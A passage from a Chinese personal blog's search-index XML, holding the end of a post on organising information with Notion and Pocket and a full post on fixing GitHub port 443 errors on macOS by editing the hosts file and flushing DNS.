database就会同步，我自己添加一些列</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/202201252.png" alt="202201252"></p><h3 id="phone-pocket-notion"><a href="#phone-pocket-notion" class="headerlink" title="phone+pocket+notion"></a>phone+pocket+notion</h3><p>移动端主要是我外出比如上班通勤，我获取信息渠道主要是阅读公众号技术文章，微信自带的浮窗和收藏很鸡肋，我是同步到pocket上，然后pocket同步到我的database上，这样我可以统一看到我的所有信息进行统一规划</p><p>当我在微信端阅读了一个技术文章</p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/202201253.png" alt="202201253" style="zoom:33%;" /><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/202201254.png" alt="202201254" style="zoom:33%;" /><p>同步成功</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/202201255.png" alt="202201255"></p><h3 id="我的notion思路"><a href="#我的notion思路" class="headerlink" title="我的notion思路"></a>我的notion思路</h3><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/202201256.png" alt="202201256"></p><p>规划（action）</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/202201257.png" alt="202201257"></p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/202201258.png" alt="202201258"></p><p>面板</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/202201259.png" alt="202201259"></p><p>知识库（repository）</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/2022012510.png" alt="2022012510"></p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/2022012511.png" alt="2022012511"></p><p>数据库：</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/2022012512.png" alt="2022012512"></p><p>当然电影和阅读这些我觉得豆瓣上已经很好用，没必要重新手工同步建一个，就目前只有一个</p><h2 id="notion给我带来了什么"><a href="#notion给我带来了什么" class="headerlink" title="notion给我带来了什么"></a>notion给我带来了什么</h2><ol><li>更直观的日常自我管理</li><li>目标细分更能推动去实现的动力，拆解成每日，每周小目标依次解决</li><li>日常处理更有针对性，专注性，同时也更高效</li><li>碎片化的信息能更敏捷的体系化，并能随时留住很棒的idea去排期实现</li><li>生活工作学习更有主次优先级</li></ol><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 效率工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> notion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决连接github中443问题</title>
      <link href="/2022/01/04/%E8%A7%A3%E5%86%B3%E8%BF%9E%E6%8E%A5github%E4%B8%AD443%E9%97%AE%E9%A2%98%20/"/>
      <url>/2022/01/04/%E8%A7%A3%E5%86%B3%E8%BF%9E%E6%8E%A5github%E4%B8%AD443%E9%97%AE%E9%A2%98%20/</url>
      
        <content type="html"><![CDATA[<h3 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h3><p>今天打开vscode试图克隆github上的项目但是报443连接失败，前提：我是全天24小时挂着代理，网上搜索的解决办法太垃圾了（关掉代理）自己尝试解决了</p><p><img src="https://bu.dusays.com/2022/01/04/9d6adfc5a98a7.png"></p><h3 id="一，查看ip"><a href="#一，查看ip" class="headerlink" title="一，查看ip"></a>一，查看ip</h3><p>点开第一个连接查看github的IP地址：<a href="https://github.com.ipaddress.com/">https://github.com.ipaddress.com/</a></p><p><img src="https://bu.dusays.com/2022/01/04/39049cd2046b8.png"></p><p>将网页中的 IP Address 复制下来 后面备用</p><p>点击第二个连接：<a href="https://github.com.ipaddress.com/assets-cdn.github.com">https://github.com.ipaddress.com/assets-cdn.github.com</a></p><p><img src="https://bu.dusays.com/2022/01/04/8cc9417e6a21d.png"></p><p>将网页中的 IP Address 复制下来 后面备用</p><p>点击第三个连接：<a href="https://github.com.ipaddress.com/assets-cdn.github.com">https://github.com.ipaddress.com/assets-cdn.github.com</a></p><p>同理记住IP address</p><h3 id="二，配置host"><a href="#二，配置host" class="headerlink" title="二，配置host"></a>二，配置host</h3><p>使用命令：</p><p><code>sudo nano /private/etc/hosts</code></p><p>输入上一步查看的ip地址</p><p><img src="https://bu.dusays.com/2022/01/04/2b233962d4ec3.png"></p><h3 id="三，刷新DNS"><a href="#三，刷新DNS" class="headerlink" title="三，刷新DNS"></a>三，刷新DNS</h3><p><code>sudo killall -HUP mDNSResponder;say DNS cache has been flushed</code></p><p>再尝试ping github成功，完美解决</p><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
